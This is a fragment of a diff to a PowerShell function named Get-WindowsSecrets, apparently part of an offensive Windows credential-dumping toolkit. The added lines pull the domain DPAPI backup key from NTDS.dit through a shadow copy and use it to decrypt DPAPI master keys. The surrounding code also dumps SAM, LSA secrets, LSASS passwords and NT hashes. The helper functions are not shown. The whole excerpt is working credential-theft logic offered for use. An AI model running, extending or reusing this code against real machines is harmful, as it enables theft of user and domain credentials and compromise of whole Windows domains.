 		[Parameter(Mandatory=$False)][String]$ActivatePrivilege,
@@ -11467,6 +12181,7 @@ function Get-WindowsSecrets()
 		{
 			$BootKey = Get-BootKey
 		}
+
 		$LSASecretKey = Get-LSASecretKey $BootKey
 		If ($LSASecretKey)
 		{
@@ -11485,6 +12200,7 @@ function Get-WindowsSecrets()
 		{
 			$BootKey = Get-BootKey
 		}
+
 		If (-not $LSASecrets)
 		{
 			$LSASecretKey = Get-LSASecretKey $BootKey
@@ -11509,13 +12225,21 @@ function Get-WindowsSecrets()
 	}
 
 	# NTDS
-	If ($NTDS)
+	If ($NTDS -and -not $SkipNTDS)
 	{
 		If (-not $BootKey)
 		{
 			$BootKey = Get-BootKey
 		}
-		$Users = Get-NTDS -Method "Shadow Copy" $BootKey
+
+		$Users, $DomainBackupKeys = Get-NTDS -Method "Shadow Copy" $BootKey $ExportDomainBackupKey
+		If ($DomainBackupKeys.Count -gt 0)
+		{
+			ForEach ($DomainBackupKeyName in $DomainBackupKeys.Keys)
+			{
+				$DomainBackupKey = $DomainBackupKeys[$DomainBackupKeyName]
+			}
+		}
 	}
 
 	# Session Tokens
@@ -11559,23 +12283,30 @@ function Get-WindowsSecrets()
 	}
 
 	# LSASS
-	If ($LSASS)
+	If ($LSASS -and -not $SkipLSASS)
 	{
 		$Pwds, $NTHs, $MasterKeys = Get-LSASS -Method "ProcOpen"
 		$LSASSDumped = $True
 	}
 
-	# DPAPI Secrets: Try to get first LSA Secrets (for DPAPI System PreKeys), LSASS (for unencrypted Masterkeys), Pwds/NT Hashes passed in parameters (to compute DPAPI User PreKeys) If not already done
+	# DPAPI Secrets
 	If ($DPAPI)
 	{
+		# Try to get first (If not already done)
+		# 	- LSA Secrets (for DPAPI System PreKeys)
+		#	- LSASS (for unencrypted Masterkeys)
+		# 	- NTDS.dit (for Domain Backup Key)
+		# 	- Pwds/NT Hashes passed in parameters (to compute DPAPI User PreKeys)
 		If (-not $BootKey)
 		{
 			$BootKey = Get-BootKey
 		}
+
 		If (-not $SecurityAccountManager)
 		{
 			$SecurityAccountManager = Get-SAM $BootKey
 		}
+
 		If (-not $LSASecrets)
 		{
 			$LSASecretKey = Get-LSASecretKey $BootKey
@@ -11589,9 +12320,21 @@ function Get-WindowsSecrets()
 			}
 		}
 
-		If (-not $SkipLSASS -and -not $LSASSDumped)
+		If (-not $LSASSDumped -and -not $SkipLSASS)
 		{
 			$Pwds, $NTHs, $MasterKeys = Get-LSASS -Method "ProcOpen"
+		}
+
+		If (-not $DomainBackupKey -and -not $SkipNTDS)
+		{
+			$Users, $DomainBackupKeys = Get-NTDS -Method "Shadow Copy" $BootKey $ExportDomainBackupKey
+			If ($DomainBackupKeys.Count -gt 0)
+			{
+				ForEach ($DomainBackupKeyName in $DomainBackupKeys.Keys)
+				{
+					$DomainBackupKey = $DomainBackupKeys[$DomainBackupKeyName]
+				}
+			}
 		}
 
 		# Get potential Pwds from parameters for DPAPI User PreKeys
@@ -11693,7 +12436,10 @@ function Get-WindowsSecrets()
 		}
 
 		$LSA_DPAPI_SYSTEM = $LSASecrets["DPAPI_SYSTEM"]["CurrVal"]
-		$MasterKeys = Get-MasterKeysFromFiles $LSA_DPAPI_SYSTEM $SecurityAccountManager $Pwds $NTHs $MasterKeys
-		Get-DPAPISecrets $MasterKeys
+		If (-not $NoMasterKeysDecryption)
+		{
+			$MasterKeys = Get-MasterKeysFromFiles $LSA_DPAPI_SYSTEM $SecurityAccountManager $Pwds $NTHs $MasterKeys $DomainBackupKey
+		}
+		Get-DPAPISecrets $MasterKeys $InUserContext $NoMasterKeysDecryption
 	}
 }
